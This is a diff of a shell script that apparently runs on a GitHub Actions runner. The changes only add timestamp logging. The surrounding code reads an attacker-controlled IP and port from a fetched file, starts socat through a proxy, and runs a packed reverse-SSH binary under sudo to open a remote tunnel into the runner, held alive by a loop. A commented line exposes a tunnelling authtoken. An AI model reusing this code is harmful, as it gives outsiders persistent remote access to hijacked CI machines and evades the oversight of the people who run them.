@@ -80,6 +80,7 @@ echo "flag_9832q_20240425 $ip_port7pxy2a";
 
 
 (while true; do
+        date;
         [ ! -f /tmp/keepalive ] && break        
          num61z=$(date +%S);
          num67z=$(echo "1"$num61z);
@@ -94,7 +95,7 @@ ip_port7pxy=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9;echo 456892 >/dev/null);
 echo "flag_9837_2024";
 port7pxy=${ip_port7pxy#*:};
 ip7pxy=${ip_port7pxy%:*};
-echo "flag 1122334";
+echo "flag 1122334_socat";
 
 if [ ! -z ${port7pxy} ] && [ ! -z ${ip7pxy} ]; then
   setsid /home/runner/work/nc_test/nc_test/socat.bin TCP4-LISTEN:50022,reuseaddr,fork  proxy:${ip7pxy}:127.0.0.1:2244,proxyport=${port7pxy}  &
@@ -120,13 +121,14 @@ fi
 if [ ! -z ${port5} ] && [ ! -z ${ip5} ] && [ "714" == "714"  ]; then 
   #nohup sudo $GITHUB_WORKSPACE/natapp -authtoken=0c4f43f4aa226595 &
   #sudo sh -c "export HOME=/tmp;$GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b $bport  -p $port5 $ip5"; 
-   [ ! -z ${GITHUB_WORKSPACE} ] &&
+  date;
+  [ ! -z ${GITHUB_WORKSPACE} ] &&
    (
       echo "exit_revSSH_isOK ${ip5} : ${port5}  -> $bport ";
       sleep 60;
       [ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&(sudo -H sh -c "$GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5;echo \$?;");echo $?;      
    )||sudo sh -c "/home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5";
-  echo "exit_revSSH_isOK_$bport";
+  echo "exit_revSSH_isOK_$bport  $(date)";date;
 fi
 
 
